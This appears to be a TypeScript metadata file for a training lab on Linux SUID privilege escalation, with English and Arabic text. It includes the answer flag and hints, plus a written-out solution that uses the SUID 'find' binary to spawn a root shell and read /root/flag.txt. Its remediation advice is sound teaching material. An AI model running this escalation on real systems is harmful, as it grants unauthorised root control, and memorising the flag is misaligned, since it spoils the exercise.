import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab2Metadata: LabMetadata = {
  slug: 'linux-lab2-suid-privesc',
  title: 'SUID Binary Privilege Escalation',
  ar_title: 'تصعيد الامتيازات عبر ثنائيات SUID',
  description: 'Find SUID binaries and escalate to root to read the protected flag.',
  ar_description: 'ابحث عن ثنائيات SUID وارقَ إلى root لقراءة الفلاج المحمي.',
  difficulty: 'INTERMEDIATE',
  category: 'FUNDAMENTALS',
  executionMode: 'SHARED_BACKEND',
  skills: ['Linux', 'SUID', 'Privilege Escalation', 'GTFOBins'],
  xpReward: 100,
  pointsReward: 100,
  duration: 30,
  isPublished: true,
  goal: 'Find SUID binaries and escalate to root to read the protected flag.',
  ar_goal: 'ابحث عن ثنائيات SUID وارقَ إلى root لقراءة الفلاج المحمي.',
  flagAnswer: 'FLAG{SUID_PRIVESC_ROOT_ACHIEVED}',
  briefing: {
    en: 'You have limited shell access. The flag is in /root/flag.txt which you cannot read directly.',
    ar: 'لديك وصول shell محدود. الفلاج في /root/flag.txt الذي لا يمكنك قراءته مباشرةً.',
  },
  stepsOverview: {
    en: [
      'Check your current user: whoami, id',
      'Find SUID binaries: find / -perm -4000 2>/dev/null',
      'Use GTFOBins to find exploit for the SUID binary',
      'Escalate to root and read /root/flag.txt',
    ],
    ar: [
      'تحقق من مستخدمك الحالي: whoami, id',
      'ابحث عن ثنائيات SUID: find / -perm -4000 2>/dev/null',
      'استخدم GTFOBins للعثور على الاستغلال للثنائي SUID',
      'ارقَ إلى root واقرأ /root/flag.txt',
    ],
  },
  solution: {
    context: 'find binary has SUID bit set. Use GTFOBins exploit to spawn a root shell.',
    vulnerableCode: '-rwsr-xr-x root root /usr/bin/find',
    exploitation: 'find . -exec /bin/sh \\; -quit → root shell → cat /root/flag.txt',
    steps: {
      en: [
        'find / -perm -4000 2>/dev/null → /usr/bin/find has SUID',
        'find . -exec /bin/sh \\; -quit → root shell',
        'cat /root/flag.txt → FLAG{SUID_PRIVESC_ROOT_ACHIEVED}',
      ],
      ar: [
        'find / -perm -4000 2>/dev/null → /usr/bin/find لديه SUID',
        'find . -exec /bin/sh \\; -quit → shell كـ root',
        'cat /root/flag.txt → FLAG{SUID_PRIVESC_ROOT_ACHIEVED}',
      ],
    },
    fix: [
      'Remove SUID from unnecessary binaries: chmod -s /usr/bin/find',
      'Use capabilities instead of SUID where possible',
      'Audit SUID binaries regularly: find / -perm -4000',
    ],
  },
  postSolve: {
    explanation: {
      en: 'SUID binaries run with the owner\'s privileges regardless of who executes them. If root owns a SUID binary that can execute shell commands, any user can escalate to root.',
      ar: 'تعمل ثنائيات SUID بامتيازات المالك بغض النظر عن من ينفذها. إذا كان root يمتلك ثنائي SUID يمكنه تنفيذ أوامر shell، يمكن لأي مستخدم الترقي إلى root.',
    },
    impact: {
      en: 'Full root compromise. Complete system takeover.',
      ar: 'اختراق root كامل. الاستيلاء الكامل على النظام.',
    },
    fix: ['Minimize SUID binaries.', 'Use Linux capabilities.', 'Regular privilege audits.'],
  },
  initialState: {},
  hints: [
    { order: 1, content: 'You need root to read /root/flag.txt. Find a way to escalate.', xpCost: 10 },
    { order: 2, content: 'SUID binaries run as root. Find them: find / -perm -4000 2>/dev/null', xpCost: 20 },
    { order: 3, content: 'find binary has SUID. GTFOBins: find . -exec /bin/sh \\; -quit', xpCost: 35 },
  ],
};
